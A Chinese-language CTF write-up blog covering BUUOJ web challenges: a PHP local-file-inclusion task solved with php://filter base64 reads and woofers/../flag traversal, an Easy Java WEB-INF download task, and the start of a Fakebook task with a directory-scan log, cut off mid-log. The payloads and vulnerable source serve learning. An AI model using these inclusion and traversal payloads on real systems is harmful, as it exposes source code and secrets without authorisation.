bad day</h1><p>拿到题目，可以看到这能提供猫猫和狗狗的图片，随便选一个  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/index.php?<span class="hljs-attribute">category</span>=woofers<br></code></pre></td></tr></table></figure><p>fuzz一下  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=woofers;ls<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(woofers;ls.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;woofers;ls.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>/<span class="hljs-keyword">index</span>.php?category=<span class="hljs-keyword">index</span><br><br>Sorry, we currently <span class="hljs-keyword">only</span> support woofers <span class="hljs-keyword">and</span> meowers.<br><br>/<span class="hljs-keyword">index</span>.php?category=meowers;flag<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(meowers;flag.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;meowers;flag.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure><p>一般这种有include函数的可以试试伪协议,然后刚才就有站点目录了，试一下目录穿越看看flag是否在根目录<br>然后若是没有那个目录会返回：<br>Sorry, we currently only support woofers and meowers.  </p><p>然后就是能用<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index<br>来返回index文件的base64<br>注意到源码里会自动给它加上.php  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: operation failed <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=index.php.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure><p>到现在能想到的是想办法目录穿越到根目录下读取flag，  </p><p>先是  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Images that spark joy&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Had a bad day?&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/material.min.css&quot;</span>&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>--<span class="hljs-title">fixed</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100&quot;&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">header</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>--<span class="hljs-title">scroll</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100 <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>-<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">title</span>&quot;&gt;<span class="hljs-title">Had</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>?&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">spacer</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">header</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">ribbon</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">main</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">main</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__content</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">container</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">grid</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--2-<span class="hljs-title">col</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">tablet</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">phone</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">white</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">shadow</span>--4<span class="hljs-title">dp</span> <span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800 <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--8-<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">crumbs</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-500&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Cheer</span> <span class="hljs-title">up</span>!&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">                <span class="hljs-title">Did</span> <span class="hljs-title">you</span> <span class="hljs-title">have</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>? <span class="hljs-title">Did</span> <span class="hljs-title">things</span> <span class="hljs-title">not</span> <span class="hljs-title">go</span> <span class="hljs-title">your</span> <span class="hljs-title">way</span> <span class="hljs-title">today</span>? <span class="hljs-title">Are</span> <span class="hljs-title">you</span> <span class="hljs-title">feeling</span> <span class="hljs-title">down</span>? <span class="hljs-title">Pick</span> <span class="hljs-title">an</span> <span class="hljs-title">option</span> <span class="hljs-title">and</span> <span class="hljs-title">let</span> <span class="hljs-title">the</span> <span class="hljs-title">adorable</span> <span class="hljs-title">images</span> <span class="hljs-title">cheer</span> <span class="hljs-title">you</span> <span class="hljs-title">up</span>!</span><br><span class="hljs-class">              &lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">include</span>&quot;&gt;</span><br><span class="hljs-class">              &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">$<span class="hljs-title">file</span> = $<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">category</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))  <span class="hljs-comment">//要有匹配的字符才能进到下一步的include函数</span><br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/div&gt;<br>          &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span> id=<span class="hljs-string">&quot;choice&quot;</span>&gt;<br>              &lt;center&gt;&lt;button onclick=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> name=<span class="hljs-string">&quot;category&quot;</span> value=<span class="hljs-string">&quot;woofers&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Woofers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">button</span> <span class="hljs-title">onclick</span>=&quot;<span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">choice</span>&#x27;).<span class="hljs-title">submit</span>();&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">category</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">meowers</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Meowers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">          &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">          &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">main</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">material</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>strpos()函数，匹配对应字符  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://512acbf5-c929-427e-aec6-d35d2e44994c.node5.buuoj.cn:81/flag.php<br><br><span class="hljs-comment">&lt;!-- Can you read this flag? --&gt;</span><br></code></pre></td></tr></table></figure><p>页面未返回404，说明flag就在站点默认目录下，并且是.php后缀<br>加上提示，就需要读取flag.php源码，<br>所以解法是利用index.php?category&#x3D;<br>里的include函数，使用伪协议编码读取flag.php的源码  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><br>解码得到flag  <br></code></pre></td></tr></table></figure><h2 id="notice-php的include函数访问目录解析："><a href="#notice-php的include函数访问目录解析：" class="headerlink" title="notice php的include函数访问目录解析："></a>notice php的include函数访问目录解析：</h2><p>kimi:<br>PHP的include函数在解析文件路径时会进行路径标准化，会按文件路径中的..&#x2F;进行目录跳转，即使没有实际的woofers文件目录。  </p><p>当woofers&#x2F;..&#x2F;flag.php被传入并交给include函数时，PHP会将其解析为flag.php，因为在路径解析过程中，..&#x2F;会跳过前面的woofers目录，最终只剩下flag.php，这也就导致了没有woofers文件目录的情况下也能解析到flag.php。  </p><p>为了防止这种情况，你应该对传入的文件名进行严格过滤和验证，避免包含目录跳转等特殊字符，只允许包含合法的文件名字符，确保传入的文件名符合预期的文件目录结构，并使用且绝对路径或限制目录范围等措施，来防止这种路径解析问题导致的安全风险。  </p><p>q:<br>听不懂，意思..&#x2F;解析的优先级大吗?</p><p>kimi:<br>在路径解析中，..&#x2F;的作用是返回上一级目录，它不是优先级的问题，而是一个路径解析的逻辑。<br>路径解析的逻辑:</p><blockquote><p>当 PHP 处理文件路径时，它是按照路径的逻辑来解析的。例如，对于路径woofers&#x2F;..&#x2F;flag.php，PHP 会先看到woofers目录，然后遇到..&#x2F;，这意味着要回到上一级目录。最后，再访问flag.php文件。<br>这个过程可以类比于你在文件系统中手动导航目录。假设你当前在某个目录下，先进入woofers子目录，然后又返回上一级目录（通过..&#x2F;），此时你又回到了原来的位置，接着再访问flag.php文件。<br>所以，在路径解析中，..&#x2F;会改变当前路径的逻辑位置，而不管文件系统中实际的目录是否存在。  </p></blockquote><p>为什么没有woofers目录也能解析:  </p><blockquote><p>PHP 在解析路径时，并不是先检查路径中的每个目录是否存在，而是先按照路径的逻辑进行标准化处理。<br>在路径woofers&#x2F;..&#x2F;flag.php中，woofers和..&#x2F;相互抵消，最终得到的路径是flag.php。PHP 会尝试去包含这个flag.php文件，不管前面的woofers目录是否存在。<br>这就好比你在数学中进行运算，5 + 3 - 3的结果是 5，中间的加和减操作是按照运算逻辑进行的，不管中间的数字是否代表实际存在的东西。<br>这种路径解析机制在 PHP 中是比较常见的，它允许灵活地引用文件，但也可能导致安全问题，如目录遍历攻击，这就是为什么需要对用户输入的文件名进行严格过滤和验证的原因。  </p></blockquote><p>我想大概意思就是会先解析完目录，再去访问目录是否存在，所以它是先解析完<br>woofers&#x2F;..&#x2F;flag.php  &#x3D;<br>&#x2F;flag<br>再去访问解析完的目录，而不会在解析时去访问woofers目录</p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>试了sql注入，点了hlep，然后试了一下常规的目录穿越，无果<br>用dirsearch扫出了&#x2F;images 访问，404，<br>得到服务器信息：<br>Apache Tomcat&#x2F;8.5.24  是一个基于java的服务端<br>直接访问了help.docx<br><a href="http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx">http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx</a><br>下载help.docx<br>里面只有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docx">Are you sure the flag is here? ? ?<br></code></pre></td></tr></table></figure><p>web题就不考虑docx隐写啥的了  </p><p>看wp：<br><a href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a><br><a href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a>  </p><p>直接搬过来：<br>WEB-INF 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。  </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"> WEB-<span class="hljs-keyword">INF</span>主要包含以下文件或目录：<br>/WEB-<span class="hljs-keyword">INF</span>/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-<span class="hljs-keyword">INF</span>/classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br>/WEB-<span class="hljs-keyword">INF</span>/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-<span class="hljs-keyword">INF</span>/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-<span class="hljs-keyword">INF</span>/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>web.xml里记有映射的文件，似乎是把url的请求映射到指定的编译号的java程序，class文件，可能和php文件差不多吧  </p><p><a href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a><br>说的很清楚了  </p><p>漏洞成因：<br><a href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a>    </p><p>反正最后是用download文件下载了flagcontainer的class文件，应该就是程序的源码？<br>或者啥的<br>然后里面有base64的flag  </p><p>这题如题，ez java<br>没接触过，不懂    </p><h2 id="class-文件是什么"><a href="#class-文件是什么" class="headerlink" title=".class 文件是什么"></a>.class 文件是什么</h2><p>.class 文件是Java编译器生成的字节码文件，它包含了Java源代码编译后的二进制表示。Java虚拟机（JVM）可以直接执行这些字节码文件，而无需依赖特定的硬件平台或操作系统</p><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>上来是一个登录和注册页面，说分享故事啥的<br>上来养成好习惯，先按f12看一下前端留有啥，<br>搜了一下flag和php，没发现有啥  </p><p>那就用bp fuzz一下login界面<br>视乎无法注入  </p><p>然后再join试了好多，都是blog is not valid<br>扫了一下服务器：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[00:10:49]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /js  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/js/</span><br><span class="hljs-selector-attr">[00:11:17]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:11:37]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:11:57]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpeg</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpg</span><br><span class="hljs-selector-attr">[00:12:33]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:16:13]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /adm/style/admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:17:30]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /admin_my_avatar<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:21:17]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /css  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/css/</span><br><span class="hljs-selector-attr">[00:21:28]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /db<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:15]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /error<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:32]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">6</span>KB - /favicon<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:22:42]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /flag<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">571</span>B  - /js/<br><span class="hljs-selector-attr">[00:24:35]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:40]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /logo<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:27:44]</span> <span 